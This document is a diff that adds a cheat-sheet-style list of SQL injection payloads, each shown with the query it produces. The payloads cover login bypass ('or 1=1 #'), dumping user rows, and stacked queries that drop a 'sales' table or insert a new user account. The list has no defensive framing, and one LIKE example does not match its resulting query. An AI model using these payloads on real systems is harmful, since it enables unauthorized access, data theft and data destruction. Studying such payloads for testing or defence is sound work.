@@ -1,0 +1,23 @@
+- Login
+    - melai' or ''=' (SELECT * from `users` WHERE `username` = 'melai' or ''='' AND `password` = 'd41d8cd98f00b204e9800998ecf8427e')
+    - melai' or 1=1 # (SELECT * from `users` WHERE `username` = 'melai' or 1=1 #' AND `password` = 'd41d8cd98f00b204e9800998ecf8427e')
+    - ' or 1 # (SELECT * from `users` WHERE `username` = '' or 1 #' AND `password` = 'd41d8cd98f00b204e9800998ecf8427e')
+
+- Get data
+	- '' or '1'='1' (SELECT id, username, first_name, last_name FROM users where id = '' or '1'='1')
+
+	- '' or ''='' (SELECT id, username, first_name, last_name FROM users where id = '' or ''='')
+	
+	- '' or 1 (SELECT id, username, first_name, last_name FROM users where id = '' or 1)
+	
+	- '' or 1 = 1 (SELECT id, username, first_name, last_name FROM users where id = '' or 1 = 1)
+	
+	- x' OR first_name='melai (SELECT id, username, first_name, last_name FROM users where username = 'melai' and first_name='melai')
+	
+	- x' OR users.first_name='melai (SELECT id, username, first_name, last_name FROM users where username = 'x' OR users.first_name='melai')
+	
+	- x' OR full_name LIKE '%Bob% (SELECT id, username, first_name, last_name FROM users where username = 'x' OR first_name LIKE '%Ra%')
+	
+	- 1; DROP table sales (SELECT * FROM users WHERE id = 1; DROP table sales)
+	
+	- 1; INSERT INTO users (`username`, `password`, `first_name`, `last_name`) values ('testuser', md5('password'), 'test user', 'test user') (SELECT * FROM users WHERE id = 1; INSERT INTO users (`username`, `password`, `first_name`, `last_name`) values ('testuser', md5('password'), 'test user', 'test user'))
